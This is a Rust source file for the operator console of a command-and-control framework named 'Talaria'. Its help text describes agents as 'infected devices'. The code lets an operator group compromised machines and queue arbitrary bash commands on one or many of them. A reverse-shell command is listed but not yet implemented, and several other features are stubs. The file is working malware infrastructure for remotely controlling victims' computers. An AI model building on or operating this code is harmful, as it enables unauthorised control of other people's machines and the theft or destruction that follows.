use crate::SharedState;
use talaria::{api::Agent, console::*, protocol::*};
use std::sync::{Arc, Mutex};

pub async fn evaluate_command(
    state: &SharedState,
    command_context: CommandContext,
) -> Result<ConsoleResponse, ConsoleError> {
    match command_context.command {
        Command::Connect { agent } => connect(state, agent, command_context.current_target).await,
        Command::Disconnect => disconnect(command_context.current_target).await,
        Command::CreateGroup { group_name, agents } => {
                create_group(state, group_name, agents).await
            }
        Command::DeleteGroup { group_name } => delete_group(state, group_name).await,
        Command::AddAgentsToGroup { group_name, agents } => {
                add_agents_to_group(state, group_name, agents).await
            }
        Command::RemoveAgentsFromGroup { group_name, agents } => {
                remove_agents_from_group(state, group_name, agents).await
            }
        Command::Exec { agents, command } => {
                exec(state, agents, command, command_context.current_target).await
            }
        Command::ListAgents => list_agents(state).await,
        Command::Ping { agents } => todo().await,
        Command::Status { agents } => todo().await,
        Command::Nickname { agent, new_name } => {
                nickname(state, command_context.current_target, agent, new_name).await
            }
        Command::Clear => clear().await,
        Command::ListGroups => list_groups(state).await,
        Command::Help => help().await,
        Command::SpawnShell { agents } => todo().await
    }
}

async fn connect(
    state: &SharedState,
    target: TargetIdentifier,
    current_target: Option<TargetIdentifier>,
) -> Result<ConsoleResponse, ConsoleError> {
    match current_target {
        Some(target) => return Err(ConsoleError::from(format!("already connected to: {}", target.to_string()))),
        None => {},
    }
    
    match &target {
        TargetIdentifier::Group { group: _ } => {
            let _ = get_group(state, None, Some(target.clone())).await?;
        }
        TargetIdentifier::Agent { agent: _ } => {
            let _ = get_agent(state, None, Some(target.clone())).await?;
        },
    }

    Ok(ConsoleResponse {
        output: format!("successfully connected to: {}", target.to_string()),
        new_target: NewTarget::Target { target },
    })
}

async fn disconnect(current_target: Option<TargetIdentifier>) -> Result<ConsoleResponse, ConsoleError> {
    match &current_target {
        Some(_) => Ok(ConsoleResponse {
            output: format!("successfully disconnected"),
            new_target: NewTarget::NoTarget,
        }),
        None => Err(ConsoleError::from("not currently connected"))
    }
}


async fn todo() -> Result<ConsoleResponse, ConsoleError> {
    Ok(ConsoleResponse {
        output: format!("not implemented yet"),
        new_target: NewTarget::NoChange,
    })
}

async fn create_group(
    state: &SharedState,
    group_name: String,
    agents: Vec<AgentIdentifier>,
) -> Result<ConsoleResponse, ConsoleError> {
    let mut agent_ids: Vec<u64> = vec![];
    
    {
        let state = state.read().await;

        if state.groups.contains_key(&group_name) {
            return Err(ConsoleError::from("group already exists"));
        }
    }

    for ident in &agents {
        agent_ids.push(get_agent(state, None, Some((*ident).clone().into())).await?.id);
    }

    agent_ids.dedup();

    {
        let mut state = state.write().await;
        state.groups.insert(group_name, agent_ids);
    }
    
    Ok(ConsoleResponse {
        output: format!("successfully created group"),
        new_target: NewTarget::NoTarget,
    })
}

async fn delete_group(state: &SharedState, group_name: String) -> Result<ConsoleResponse, ConsoleError> {
    let mut state = state.write().await;

    match state.groups.remove(&group_name) {
        Some(_) => Ok(ConsoleResponse {
            output: format!("successfully deleted group: {}", group_name),
            new_target: NewTarget::NoChange,
        }),
        None => Err(ConsoleError::from(format!("could not delete group {}", group_name))),
    }
}

async fn add_agents_to_group(
    state: &SharedState,
    group_name: String,
    agents: Vec<AgentIdentifier>,
) -> Result<ConsoleResponse, ConsoleError> {
    let mut agent_ids: Vec<u64> = vec![];

    for ident in agents {
        agent_ids.push(get_agent(state, None, Some(ident.into())).await?.id);
    }

    agent_ids.dedup();

    modify_group(state, async |group| {
        group.append(&mut agent_ids);
        group.dedup();
    },
    None, Some(TargetIdentifier::Group { group: group_name })).await?;
    

    Ok(ConsoleResponse {
        output: format!("successfully added agents to group"),
        new_target: NewTarget::NoChange,
    })
}

async fn remove_agents_from_group(
    state: &SharedState,
    group_name: String,
    agents: Vec<AgentIdentifier>,
) -> Result<ConsoleResponse, ConsoleError> {
    let mut agent_ids: Vec<u64> = vec![];

    for ident in agents {
        let agent = get_agent(state, None, Some(ident.into())).await?;
        agent_ids.push(agent.id);
    }

    agent_ids.dedup();
    
    modify_group(state, async |group| {
        for (index, agent) in group.clone().into_iter().enumerate() {
            for agent_id in &agent_ids {
                if agent.clone() == *agent_id {
                    group.remove(index);
                }
            }
        }
    }, None, Some(TargetIdentifier::Group { group: group_name })).await?;

    Ok(ConsoleResponse {
        output: format!("succesfully removed agents from group"),
        new_target: NewTarget::NoChange,
    })
}

async fn clear() -> Result<ConsoleResponse, ConsoleError> {
    Ok(ConsoleResponse {
        output: "\x1B[2J\x1B[1;1H".to_string(),
        new_target: NewTarget::NoChange,
    })
}

async fn list_agents(state: &SharedState) -> Result<ConsoleResponse, ConsoleError> {
    let state = state.read().await;
    let mut output = String::new();

    for (id, agent) in &state.agents {
        output.push_str(
            format!(
                "{} - [{}]\n",
                id,
                agent.clone().nickname.unwrap_or(String::from("!!!"))
            )
            .clone()
            .as_str(),
        );
    }

    Ok(ConsoleResponse {
        output,
        new_target: NewTarget::NoChange,
    })
}

async fn list_groups(state: &SharedState) -> Result<ConsoleResponse, ConsoleError> {
    let groups = state.read().await.groups.clone();
    let mut output = String::new();

    for (group_name, ids) in &groups {
        output.push_str(&format!("#{}:\n", group_name));

        for id in ids {
            let agent = get_agent(state, None, Some(TargetIdentifier::Agent { agent: AgentIdentifier::ID { id: *id} })).await?;

            output.push_str(
                format!(
                    "   {} - [{}]\n",
                    id,
                    agent.nickname.clone().unwrap_or(String::from("!!!"))
                )
                .clone()
                .as_str(),
            );
        }
    }

    Ok(ConsoleResponse {
        output,
        new_target: NewTarget::NoChange,
    })
}

async fn nickname(
    state: &SharedState,
    current_target: Option<TargetIdentifier>,
    agent: Option<AgentIdentifier>,
    nickname: String,
) -> Result<ConsoleResponse, ConsoleError> {
    let target = Some(TargetIdentifier::Agent { agent: expect_agent_ident(current_target, agent.map(|a| TargetIdentifier::Agent { agent: a }))? });
    
    modify_agent(state, async |agent| {
        agent.nickname = Some(nickname);
    }, None, target).await?;

    Ok(ConsoleResponse {
        output: format!("nickname set successfully"),
        new_target: NewTarget::NoChange,
    })
}

async fn exec(
    state: &SharedState,
    agents: Option<TargetIdentifier>,
    command: String,
    current_target: Option<TargetIdentifier>,
) -> Result<ConsoleResponse, ConsoleError> {
    let target = get_target(current_target, agents)?;

    let agent_ids = match target {
        TargetIdentifier::Group { group: _} => get_group(state, None, Some(target)).await?,
        TargetIdentifier::Agent { agent: _ } => vec![get_agent(state, None, Some(target)).await?.id],
    };

    // FIXME: HACK
    let instruction = AgentInstructionBody::Command {
        command_id: 1, // FIXME: command_id should be unique, and generated
        command: "bash".to_string(),
        args: vec!["-c".to_string(), command]
    };

    for agent_id in agent_ids {
        modify_agent(state, async |agent| {
            agent.queue_instruction(&instruction);
        }, None, Some(TargetIdentifier::Agent { agent: AgentIdentifier::ID { id: agent_id }})).await?;
    }

    Ok(ConsoleResponse {
        output: format!("command queued successfully"),
        new_target: NewTarget::NoChange,
    })
}

async fn status(
    state: &SharedState,
    agents: Option<TargetIdentifier>,
    current_target: Option<TargetIdentifier>,
) -> ConsoleResponse {
    let mut state = state.write().await;
    

    todo!()
}

async fn spawn_shell(
    state: &SharedState,
    agents: Option<TargetIdentifier>,
    current_target: Option<TargetIdentifier>,
) -> ConsoleResponse {
    let mut state = state.write().await;

    todo!()
}


async fn help() -> Result<ConsoleResponse, ConsoleError> {
    let output: String = 
r#"---------------------------------------------------------------------------------------------------------------------
 _____          _
|_   _|_ _ _ __| |_ __ _ _ __ _   _ ___
  | |/ _` | '__| __/ _` | '__| | | / __|
  | | (_| | |  | || (_| | |  | |_| \__ \
  |_|\__,_|_|   \__\__,_|_|   \__,_|___/
---------------------------------------------------------------------------------------------------------------------
Vocab:
    agent    | An infected device
    group    | A named collection of infected devices
    target   | Either a single infected device, or a group of infected devices
    <>       | Required argument
    []       | Optional argument, if connected to a target and the argument is optional, command defaults to target
---------------------------------------------------------------------------------------------------------------------
Commands:
    connect <target>                                            | Connects to an agent or group 
    disconnect                                                  | Disconnects from an agent or gropu
    create_group <group_name> <agent1> <agent2>                 | Creates a group
    delete_group <group_name>                                   | Deletes a group
    add_agents_to_group <group_name> <agent1> <agent2>          | Adds agents to a group
    remove_agents_from_group <group_name> <agent1> <agent2>     | Removes agents from a group
    exec [target] <command>                                     | Executes a shell command on an agent or group
    spawn_shell [target]                                        | Spawns a reverse shell on the agent or group
    list                                                        | Lists agents
    list_groups                                                 | Lists groups
    ping [target]                                               | Pings an agent or group
    status [target]                                             | Prints the status of an agent or group
    nickname [agent] <nickname>                                 | Sets the nickname of an agent
    clear                                                       | Clears the terminal
    help                                                        | Displays this message
---------------------------------------------------------------------------------------------------------------------"#
    .into();

    Ok(ConsoleResponse {
        output,
        new_target: NewTarget::NoChange,
    })
}

/// Takes in two targets and returns the first Some(T)
/// target found, in the following order:
/// 1. Explicit
/// 2. Implicit
/// 3. None
fn get_target(implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<TargetIdentifier, ConsoleError> {
    match explicit {
        Some(target) => return Ok(target),
        None => {}
    }

    match implicit {
        Some(target) => Ok(target),
        None => Err(ConsoleError::from("not connected to any target, and no target is specified")),
    }
}

fn expect_agent_ident(implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<AgentIdentifier, ConsoleError> {
    match explicit {
        Some(target) => {
            match target {
                TargetIdentifier::Group { group: _ } => return Err(ConsoleError::from("expected agent identifier, got group identifier")),
                TargetIdentifier::Agent { agent } => return Ok(agent),
            }
        }
        None => {}
    }

    match implicit {
        Some(target) => {
            match target {
                TargetIdentifier::Group { group: _ } => return Err(ConsoleError::from("must be connected to agent, or agent must be specified")),
                TargetIdentifier::Agent { agent } => return Ok(agent),
            }
        }
        None => return Err(ConsoleError::from("must be connected to agent, or agent must be specified")),
    }
}

fn expect_group_ident(implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<String, ConsoleError> {
    match explicit {
        Some(target) => {
            match target {
                TargetIdentifier::Group { group } => return Ok(group),
                TargetIdentifier::Agent { agent: _ } => return Err(ConsoleError::from("expected group identifier, got agent identifier")),
            }
        }
        None => {}
    }

    match implicit {
        Some(target) => {
            match target {
                TargetIdentifier::Group { group } => return Ok(group),
                TargetIdentifier::Agent { agent: _ } => return Err(ConsoleError::from("must be connected to gropu, or group must be specified")),
            }
        }
        None => return Err(ConsoleError::from("must be connected to agent, or agent must be specified")),
    }
}

async fn get_agent(state: &SharedState, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<Agent, ConsoleError> {
    let state = state.read().await;

    let agent_ident = expect_agent_ident(implicit, explicit)?;
    
    let agent = match state.get_agent(&agent_ident) {
        Some(agent) => agent.clone(),
        None => match agent_ident {
            AgentIdentifier::Nickname { nickname } => return Err(ConsoleError::from(format!("unable to find agent with nickname: {}", nickname))),
            AgentIdentifier::ID { id } => return Err(ConsoleError::from(format!("unable to find agent with id: {}", id))),
        }
    };

    Ok(agent)
}

async fn modify_agent<F>(state: &SharedState, closure: F, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<(), ConsoleError>
where 
    F: AsyncFnOnce(&mut Agent)
{
    let mut state = state.write().await;
    let agent_ident = expect_agent_ident(implicit, explicit)?;
    let agent = state.get_agent_mut(&agent_ident);

    
    match agent {
        Some(agent) => return Ok(closure(agent).await),
        None => match agent_ident {
            AgentIdentifier::Nickname { nickname } => Err(ConsoleError::from(format!("unable to find agent with nickname: {}", nickname))),
            AgentIdentifier::ID { id } => Err(ConsoleError::from(format!("unable to find agent with id: {}", id))),
        }
    }
}

async fn get_group(state: &SharedState, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<Vec<u64>, ConsoleError> {
    let state = state.read().await;

    let group_ident = expect_group_ident(implicit, explicit)?;
    
    match state.groups.get(&group_ident) {
        Some(group) => return Ok(group.clone()),
        None => Err(ConsoleError::from(format!("unable to find group: {}", group_ident))),
    }
}


async fn modify_group<F>(state: &SharedState, closure: F, implicit: Option<TargetIdentifier>, explicit: Option<TargetIdentifier>) -> Result<(), ConsoleError>
where 
    F: AsyncFnOnce(&mut Vec<u64>)
{
    let mut state = state.write().await;
    let group_ident = expect_group_ident(implicit, explicit)?;
    let group = state.groups.get_mut(&group_ident);

    
    match group {
        Some(group) => Ok(closure(group).await),
        None => Err(ConsoleError::from(format!("unable to find group: {}", group_ident))),
    }
}
